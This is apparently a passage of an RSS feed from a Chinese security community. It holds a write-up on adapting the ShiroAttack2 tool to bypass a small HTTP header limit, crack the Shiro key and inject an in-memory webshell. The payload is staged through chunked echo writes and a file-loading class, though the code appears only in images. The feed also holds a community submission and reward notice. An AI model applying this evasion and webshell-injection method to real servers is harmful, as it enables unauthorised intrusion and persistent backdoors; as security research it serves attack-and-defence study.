&lt;p&gt;从代码和抓包看，其实ShiroAttack2自身已经对Header头限制进行了绕过，包括内存马注入这些都是有分离处理。 &lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462302-121252-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
大部分tomcat环境配置环境对header头限制大概为8k。但是遇到&lt;strong&gt;这个目标环境对header头限制的更小，大概只有2-4k左右，payload超过就会报错。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;所以导致shiro attack2无法成功反序列话rememberMe中携带数据&lt;/p&gt;

&lt;p&gt;好了，开始解决，思路&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;项目: 
修改https://github.com/SummerSec/ShiroAttack2

所以我们要的处理思路，就是缩短ShiroAttack2中 rememberMe加密后header头部分&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看工具怎么解决&lt;br&gt;
1、 解决命令执行问题，发现ShiroAttack2 SpringEcho的类本身就比较短：&lt;br&gt;
直接看代码，在: com.summersec.attack.deser.echo.SpringEcho.java中&lt;/p&gt;

&lt;p&gt;原来代码：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462420-540255-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
&lt;strong&gt;思路就是缩短长度！！！！！！&lt;/strong&gt;&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462526-136983-wx20241009-162829.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;pre&gt;&lt;code&gt;我们可以通过缩短变量名称，去除不必要语句，来缩短Header头的长度，利群工具的SpringEcho肯定比这个代码量少一些：

由于已经知道os为linux系统，所以我直接把原来的 
String[] cmd = System.getProperty(\&quot;os.name\&quot;).toLowerCase().contains(\&quot;windows\&quot;) 
逻辑去掉了，然后重命名了一些变量名&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462562-95600-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462588-867599-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
然后运行程序&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462608-950753-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;成功找到key！！&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462649-820582-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
运行命令成功，但是还达不到我们的目录，目标上马&lt;br&gt;
&lt;strong&gt;注入内存马，也是因为请求Header头被限制，无法注入：&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;然后我们看shiro attack2项目关于内存马注入的部分：
类：com.summersec.attack.deser.plugins. InjectMemTool&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462711-714506-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
别人的思路：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;发现核心其实是，InjectMemTool类和getFV方法，然而这个作者已经写的很精简了，我们在怎么精简，也很难达到预期的长度。

想了半天，没缩减成功，选择了一个迂回的思路，其实分两步走，
1、先把内存马的paylaod部分放到服务器上（/data/mvc.txt）
2、然后重写InjectMemTool类，不通过请求解析来内存马body部分，直接从服务器上读取解析，打入内存马

这样就可以减少大量代码了：


重写后的核心，先用BufferedReader先把内存马数据读取，然后通过defineClass反射加载调用，在newInstacnce（）创建对象后，自动完成添加内存马的逻辑。

因为不确定shiroAttack2 中内存马读取有没有进行特殊处理，改动比较大，所以我们可以选择JMG 工具来生成内存马：

https://github.com/pen4uin/java-memshell-generator-release&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后程序我们进行更改&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462788-940207-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
将结果输出上传/data/mvc.txt，由于目标不出网，所以通过echo命令写入，还是长度限制，我们要把payload分割一下,多次执行：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462834-382538-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
最后通过shiroAttack2 将修改后的InjectMemTool打出去即可，执行注入：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462874-197015-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
最终当然是成功了！！！&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2950-shiro</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2950-shiro</guid><pubDate>Wed, 09 Oct 2024 08:35:19 GMT</pubDate><author>大反派</author><category>原创文章</category><category>应用安全</category><category>挖洞姿势</category></item><item><title>火线Zone 24年社区规则升级，共建技术安全生态</title><description>&lt;p&gt;火线Zone是由火线安全平台打造的安全技术专家聚集和交流的社区，旨在推动数智时代的安全生态。&lt;/p&gt;

&lt;p&gt;通过火线Zone内容社区、火线技术沙龙等形式，为技术专家提供最前沿的技术分享和交流。目前，火线Zone社区成员已超过20000人的规模，其中不乏来自腾讯、华为、Gitlab、绿盟、去哪儿等知名企业的CTO、CISO、安全VP、安全技术专家等，通过社群和活动讨论交流安全攻防、黑客溯源、企业安全管理、安全运营、软件应用安全、云计算安全等方向技术话题。&lt;/p&gt;

&lt;p&gt;截止目前，火线Zone累计举办公开的技术交流活动27场(&lt;a href=&quot;https://space.bilibili.com/503330419/search/video?keyword=%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;点击查看&lt;/a&gt;)、技术内容超过2000篇、10余个城市举办线下交流活动，全方位促进社区成员与企业之间的学习、交流与合作，为安全从业者提供全新思路，共同探讨行业未来发展之路。&lt;/p&gt;

&lt;p&gt;在这里，我们重视每一位成员的声音！火线Zone现在诚挚邀请您加入我们的数智安全社区，分享自己经验，和大咖共探数智安全未来。&lt;/p&gt;

&lt;h1&gt;投稿须知&lt;/h1&gt;
&lt;p&gt;欢迎您向火线Zone投稿，分享您的知识和经验。为了确保您的稿件能够顺利通过审核并发表，请您仔细阅读以下投稿指南：&lt;br&gt;
投稿文章内容方向包括并不仅限于以下方向：&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;应用安全：当年最新的漏洞分析、安全预警及最新的测试技巧，并具备广泛影响性。&lt;/li&gt;
&lt;li&gt;APP安全：针对APP、小程序的实战对抗、逆向分析、隐私合规等实战评估及测试方法论内容。&lt;/li&gt;
&lt;li&gt;AIOT安全：针对可穿戴设备、安防设备、智能家居、汽车、工业设备等硬件设备的逆向分析、漏洞挖掘的实战评估和测试方法论内容&lt;/li&gt;
&lt;li&gt;黑客事件：针对DDOS、勒索病毒、APT攻击等实战黑客攻击的完整事件溯源分析以及威胁分析的方法论。&lt;/li&gt;
&lt;li&gt;红队攻防：针对中大型企业的真实攻防案例，具备防御机制绕过、内网横向、公有云横向等环节内容&lt;/li&gt;
&lt;li&gt;安全运营：针对基础安全、开发安全、办公网安全、安全托管运营等安全运营方向的实战落地内容&lt;/li&gt;
&lt;li&gt;其他：前沿领域安全研究，如大模型安全、AI应用安全等&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;希望你的文章质量满足以下要求：&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;提供深入的分析和独到见解，揭示未公开的新内容。&lt;/li&gt;
&lt;li&gt;全面总结某一领域知识，可作为参考手册。&lt;/li&gt;
&lt;li&gt;确保内容已授权且完全脱敏，遵守法律法规，不涉及非法安全测试。&lt;/li&gt;
&lt;li&gt;文章篇幅需要符合深度分析的篇幅要求，具体篇幅长度视内容类型审核&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;审核流程说明：&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;投稿后，若15天内未收到发表通知，您可自行决定是否向其他平台投稿。我们反对一稿多投，一经发现，将不予审核通过。&lt;/li&gt;
&lt;li&gt;火线Zone不提供稿件退回服务，请作者自行备份原稿。&lt;/li&gt;
&lt;li&gt;对于非原创、抄袭、洗稿或未遵守转载规则的稿件，我们将进行删除处理，并取消任何奖励，同时发布违规公告。&lt;/li&gt;&lt;/ol&gt;

&lt;h1&gt;如何投稿&lt;/h1&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;在线投稿&lt;br&gt;
（注：为方便查看稿件审阅进度，请优先选择在线投稿方式）&lt;br&gt;
进入火线Zone[&lt;a href=&quot;https://zone.huoxian.cn/&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;https://zone.huoxian.cn/&lt;/a&gt;]&amp;gt;点击左上方【发布主题】-&amp;gt; 在文章开头添加#应用安全#等文章类型标签。&lt;br&gt;
文章稿件支持Markdown格式，文章发布后，社区管理员将对其进行审核并进行精华优选，请耐心等待审核。&lt;br&gt;
没有火线Zone账户的用户，可前往火线Zone注册申请加入。&lt;/li&gt;
&lt;li&gt;邮件投稿&lt;br&gt;
您也可以将文章或稿件发送至&lt;a href=&quot;mailto:zone@huoxian.cn&quot; rel=&quot;&quot; target=&quot;&quot;&gt;zone@huoxian.cn&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;稿件疑问&lt;br&gt;
欢迎添加火线安全小助手，投稿问题可随时咨询。&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-03-11/1710152605-174769-image.png&quot; title=&quot;&quot; alt=&quot;&quot; height=&quot;200&quot; width=&quot;200&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/li&gt;&lt;/ol&gt;

&lt;h1&gt;投稿奖励&lt;/h1&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;基础奖励：如果您未有火线安全平台认证邀请码，文章通过后你将获取到邀请码一枚，可以来注册成为火线白帽子参与平台漏洞悬赏项目。&lt;/li&gt;
&lt;li&gt;基础奖励：文章如审核通过即可获普通文章奖励（50查克拉积分），可用于兑换火线安全商城的礼品&lt;/li&gt;
&lt;li&gt;优秀奖励：文章内容符合社区征稿意向，内容充实有新意可获优秀文章奖励（50查克拉积分 + 500RMB）。&lt;/li&gt;
&lt;li&gt;精华奖励：最新的事件分析和安全预警，分享业内前沿最新技术、 0day 分析与利用、个人安全开发研究新成果 等方面的奇技淫巧、心经等可获加精文章奖励(（100查克拉 + 1000RMB）。&lt;/li&gt;
&lt;li&gt;精华奖励：发布文章并获取精华标签后，可以直接加入渗透测试、APP安全、IOT安全、威胁情报、红蓝对抗等相关领域核心众测群，参与平台私密众测项目。&lt;/li&gt;
&lt;li&gt;无奖励：内容深度较浅或网上有一定公开类似，则不予奖励。&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;内容奖励要求：&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;基础奖励在内容符合要求的前提下，阅读量不做要求&lt;/li&gt;
&lt;li&gt;优秀奖励在内容符合要求的前提下，阅读量当月突破500&lt;/li&gt;
&lt;li&gt;精华奖励在内容符合要求的前提下，阅读量当月突破1000（内容质量较高不受此条件限制）&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;奖励将在每月第一周公示并发放至火线安全平台账户，可在火线安全平台申请提现。&lt;br&gt;
PS：文章通过后请联系“火线小助手”加入火线Zone创作者群，与其他创作者一起思想碰撞！&lt;/p&gt;


&lt;h1&gt;转载说明&lt;/h1&gt;
&lt;p&gt;为了维护原创作者的权益，确保内容的合法传播，特制定以下转载规则。在您希望转载火线Zone社区的文章时，请务必遵守以下指南：&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;版权声明：在您的平台上转载文章时，请明确标注【原文来自火线Zone、原文作者以及原文链接】。&lt;/li&gt;
&lt;li&gt;转载声明：请在文章的显著位置注明以下声明：“本文经火线Zone授权发布，转载请联系火线Zone社区。”&lt;/li&gt;
&lt;li&gt;内容修改：您可以对文章标题和内容进行适度修改，以适应您的平台风格，但请确保不改变文章的核心观点和主旨。&lt;/li&gt;
&lt;li&gt;公众号转载：若您希望在微信公众号上转载，请先通过火线Zone社区的官方渠道申请授权。获得授权后，请在文章开头注明公众号信息，并在文末附上转载声明。&lt;/li&gt;
&lt;li&gt;责任归属：转载文章产生的任何版权纠纷，由转载方自行承担。请尊重知识产权，未经授权的转载行为将被视为侵权。&lt;/li&gt;
&lt;li&gt;独家代理：如果您是文章的原创作者，并且希望火线Zone作为您作品的独家代理，请在投稿时声明，并确保作品未在其他平台发布。&lt;/li&gt;
&lt;li&gt;版权保证：投稿者需保证拥有所投稿件的完整著作权，并授权火线Zone及其关联平台进行发布和传播。&lt;br&gt;
我们期待与您共同维护一个尊重原创、鼓励分享的社区环境。感谢您的理解和支持！&lt;/li&gt;&lt;/ol&gt;

&lt;h1&gt;加入社群&lt;/h1&gt;
&lt;p&gt;火线Zone已经开启外部粉丝社区群和城市技术社群，大家可在群内进行技术交流，但严禁发表与技术无关的和讨论政治相关内容&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-03-11/1710152605-174769-image.png&quot; title=&quot;&quot; alt=&quot;&quot; height=&quot;200&quot; width=&quot;200&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
添加“火线小助手”，并发送以下关键字加入社区&lt;br&gt;
并发送“社区群”可以加入火线Zone社区技术群&lt;br&gt;
发送“同城群”可以加入火线Zone城市分群&lt;/p&gt;

&lt;p&gt;向WooYun Zone、Drops致敬&lt;/p&gt;

&lt;p&gt;：）&lt;/p&gt;

</description><link>https://zone.huoxian.cn/d/2891-zone-24</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2891-zone-24</guid><pubDate>Mon, 11 Mar 2024 10:21:51 GMT</pubDate><author>智能安全助手</author><category>官方公告</category></item></channel></rss>